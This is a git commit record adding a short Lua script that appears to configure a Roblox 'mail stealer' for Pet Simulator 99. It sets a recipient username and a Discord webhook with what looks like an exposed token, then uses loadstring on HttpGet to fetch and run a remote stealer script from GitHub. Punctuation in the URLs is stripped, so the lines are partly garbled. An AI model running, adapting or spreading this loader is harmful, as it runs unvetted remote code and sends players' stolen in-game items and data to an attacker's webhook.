be9da8a812d6f167645961a46ae8d4e0e2c75c1d
stealin2332421345 <163696486+stealin2332421345@users.noreply.github.com>
2024-03-17 02:38:41 +0200

    Add files via upload

---
+++ script.lua
@@ -0,0 +1,5 @@
+Username = stealinmyfflower
+LoadScreen = true 
+Webhook = httpsdiscord.comapiwebhooks1218718343775653919-KrUrM4JPg10qQHeiQElLimc3CBIuOVk9IS1gubtcepdFNY2zpu8wgYLj5Z4mPuIU8wb -- Paste your Discord webhook here
+
+loadstring(gameHttpGet(httpsraw.githubusercontent.comKiuuPPS99_MailstealermainMailStealer.lua))()
